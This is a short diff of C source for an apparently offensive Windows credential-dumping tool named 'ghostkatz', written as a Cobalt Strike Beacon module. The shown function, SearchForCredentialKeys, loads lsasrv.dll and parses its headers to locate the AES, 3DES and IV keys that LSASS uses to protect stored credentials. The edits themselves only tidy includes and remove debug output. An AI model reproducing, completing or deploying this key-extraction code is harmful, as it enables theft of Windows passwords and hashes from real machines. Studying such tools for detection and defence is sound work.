@@ -1,9 +1,10 @@
+#pragma once
 #include <windows.h>
 #include <ntstatus.h>
 
 #include "ghostkatz.h"
 #include "defs.h"
-#include "lsass_getkeys.h"
+#include "lsass_offsets.h"
 
 BOOL SearchForCredentialKeys(char* pvWindowsVersion, DWORD64* hAesKeyAddress, DWORD64* h3DesKeyAddress, DWORD64* IVAddress)
 {
@@ -34,22 +35,12 @@ BOOL SearchForCredentialKeys(char* pvWindowsVersion, DWORD64* hAesKeyAddress, DW
         return FALSE;
     }
 
-/*
-#ifdef _DEBUG
-    PrintHex(credentialKeySig, KeySigSize);
-    BeaconPrintf(CALLBACK_OUTPUT, "AES_OFFSET: %d", AES_OFFSET);
-    BeaconPrintf(CALLBACK_OUTPUT, "DES_OFFSET: %d", DES_OFFSET);
-    BeaconPrintf(CALLBACK_OUTPUT, "IV_OFFSET: %d", IV_OFFSET);
-#endif
-*/
-
     PBYTE lsasrvImageBase = (PBYTE)LoadLibraryA("lsasrv.dll");
     if (lsasrvImageBase == NULL)
     {
         BeaconFormatPrintf(&outputbuffer, "Failed to get lsasrv DLL address!");
         return FALSE;
     }
-    //DEBUG_PRINT("Loaded lsasrv.dll at address %p\n", lsasrvImageBase);
 
     PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lsasrvImageBase;
     PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
